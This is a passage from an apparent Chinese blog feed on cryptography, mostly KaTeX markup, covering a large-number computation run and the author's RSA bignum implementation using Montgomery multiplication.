class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">3</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">7</span><span class=\"mord\">2</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">2</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">4</span><span class=\"mord\">7</span><span class=\"mord\"><span class=\"mord\">6</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.864108em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mbin mtight\">×</span><span class=\"mord mtight\">2</span><span class=\"mbin mtight\">×</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">3</span><span class=\"mbin mtight\">×</span><span class=\"mord mtight\">8</span><span class=\"mord mtight\">7</span><span class=\"mord mtight\">8</span><span class=\"mord mtight\">3</span><span class=\"mbin mtight\">×</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">4</span><span class=\"mord mtight\">1</span><span class=\"mord mtight\">9</span><span class=\"mord mtight\">7</span><span class=\"mord mtight\">8</span><span class=\"mord mtight\">1</span><span class=\"mord mtight\">9</span><span class=\"mord mtight\">5</span><span class=\"mord mtight\">6</span><span class=\"mord mtight\">4</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">5</span><span class=\"mord mtight\">7</span><span class=\"mord mtight\">6</span><span class=\"mord mtight\">3</span><span class=\"mbin mtight\">×</span><span class=\"mord mtight\">1</span><span class=\"mord mtight\">9</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">8</span><span class=\"mord mtight\">8</span><span class=\"mord mtight\">8</span><span class=\"mord mtight\">7</span><span class=\"mord mtight\">6</span><span class=\"mord mtight\">8</span><span class=\"mord mtight\">6</span><span class=\"mord mtight\">4</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">3</span><span class=\"mord mtight\">1</span><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span><span class=\"mord mtight\">1</span><span class=\"mord mtight\">1</span><span class=\"mbin mtight\">×</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">3</span><span class=\"mord mtight\">4</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">0</span><span class=\"mord mtight\">4</span><span class=\"mord mtight\">3</span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-0.8979459999999992em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">7</span><span class=\"mord\">2</span><span class=\"mord\">7</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">5</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">8</span></span></span><span style=\"top:0.6020540000000016em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">3</span><span class=\"mord\">6</span><span class=\"mord\">1</span><span class=\"mord\">2</span><span class=\"mord\">4</span><span class=\"mord\">3</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">9</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.262054000000002em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>输入文件  <code>input</code>  内容如下：</p>\n<p><figure class=\"highlight plaintext\"><figcaption><span>raw</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3768901521908407201157691198029711972876087647970824596533</span><br><span class=\"line\">9993115456385501509</span><br><span class=\"line\">1672705575588793411750559287020484713881877693514202546508</span><br><span class=\"line\">2120553873612439845419858696451540936395844505496867133711</span><br></pre></td></tr></table></figure></p>\n<p>我在 Linux 虚拟机环境下计算，配置：</p>\n<ul>\n<li>CPU：Intel (R) Xeon (R) CPU E7-4830 v3 @ 2.10GHz 总共 8 核</li>\n<li>内存： 16.00 GiB</li>\n<li>OS：Ubuntu 22.04</li>\n</ul>\n<p>(fish) 开始计算：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nohup bash ./my_program &gt; output.log 2&gt;&amp;1 &amp; set pid $last_pid; echo $pid &gt; pid</span><br></pre></td></tr></table></figure></p>\n<p>计算结果：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mn>4823944491583471581</mn></mrow><annotation encoding=\"application/x-tex\">4823944491583471581\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">2</span><span class=\"mord\">3</span><span class=\"mord\">9</span><span class=\"mord\">4</span><span class=\"mord\">4</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">1</span></span></span></span></span></p>\n<p>计算时间：</p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "数学",
                "密码学",
                "密码学"
            ]
        },
        {
            "id": "https://taf.fyi/math/cryptography/rsa/",
            "url": "https://taf.fyi/math/cryptography/rsa/",
            "title": "RSA",
            "date_published": "2024-12-11T16:00:00.000Z",
            "content_html": "<h1 id=\"大数运算\"><a class=\"anchor\" href=\"#大数运算\">#</a> 大数运算</h1>\n<p>我的大数运算实现基本参考了 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVhcnNzbC5vcmcvYmlnaW50Lmh0bWw=\">BearSSL</span> 的实现思路来实现。</p>\n<p>存储上，2048-bits 的大数存到 32 个  <code>uint64_t</code>  作为 limb 实现，limb 是大数库中常见的一个概念，表示我这里每一个  <code>uint64_t</code>  单位，它们相差 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi><mo>=</mo><msup><mn>2</mn><mn>64</mn></msup></mrow><annotation encoding=\"application/x-tex\">W=2^{64}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">6</span><span class=\"mord mtight\">4</span></span></span></span></span></span></span></span></span></span></span></span> 大小的基。</p>\n<p>由于一开始我实现大数库的时候，设计的可能不是特别到位，limb 的存储顺序是低位到高位放在下标从低到高，和输入的数据反过来，所以程序中相应的处理了一下。</p>\n<p>加减法没有特殊的优化，单纯的：加法从最低位 limb 加到最高位 limb，减法从最高位 limb 减到最低位 limb。</p>\n<p>乘法的优化是比较关键的部分，采用 Montgomery 模乘，其原理在上述 BearSSL 的文章中有详细介绍。</p>\n<h2 id=\"预计算\"><a class=\"anchor\" href=\"#预计算\">#</a> 预计算</h2>\n<p>为了最大限度利用 Montgomery 模乘优化，在输入有限域的模  <code>p</code>  也就是 RSA 中的  <code>n</code>  时，就需要初始化计算好如下内容：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msup><mi>p</mi><mn>2</mn></msup><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>p</mi><mspace linebreak=\"newline\"></mspace><msup><mi>R</mi><mn>2</mn></msup><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>p</mi><mspace linebreak=\"newline\"></mspace><mi>g</mi><mo>=</mo><msubsup><mi>p</mi><mn>0</mn><mrow><mo>−</mo><mn>1</mn></mrow></msubsup><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">p^2\\bmod p\\\\\nR^2\\bmod p\\\\\ng=p_0^{-1}\\bmod W\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0585479999999998em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1205469999999997em;vertical-align:-0.256439em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-2.4435610000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.256439em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span></span></span></span></span></p>\n<p>其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>R</mi><mo>=</mo><msup><mi>W</mi><mi>N</mi></msup><mo>=</mo><msup><mn>2</mn><mrow><mn>32</mn><mo>⋅</mo><mn>64</mn></mrow></msup><mo>=</mo><msup><mn>2</mn><msup><mn>2</mn><mn>11</mn></msup></msup></mrow><annotation encoding=\"application/x-tex\">R=W^{N}=2^{32\\cdot64}=2^{2^{11}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8413309999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">3</span><span class=\"mord mtight\">2</span><span class=\"mbin mtight\">⋅</span><span class=\"mord mtight\">6</span><span class=\"mord mtight\">4</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9869199999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9869199999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913142857142857em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>N</mi></mrow><annotation encoding=\"application/x-tex\">N</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span></span></span></span> 来自 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span> 存储所占用的 limb 的数量，当然不一定是 32，只是 RSA-2048 中都是 32。</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>g</mi></mrow><annotation encoding=\"application/x-tex\">g</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span></span></span></span> 是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span> 的最低位一个 limb <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>p</mi><mn>0</mn></msub></mrow><annotation encoding=\"application/x-tex\">p_0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 模 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi><mo>=</mo><msup><mn>2</mn><mn>64</mn></msup></mrow><annotation encoding=\"application/x-tex\">W=2^{64}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">6</span><span class=\"mord mtight\">4</span></span></span></span></span></span></span></span></span></span></span></span> 下的逆，用来加速模 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span> 的 Montgomery 乘法。</p>\n<h3 id=\"r2bmod-p\"><a class=\"anchor\" href=\"#r2bmod-p\">#</a> <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>R</mi><mn>2</mn></msup><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">R^2\\bmod p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span></h3>\n<p>我对 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>R</mi><mn>2</mn></msup><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">R^2\\bmod p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span> 的实现如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span 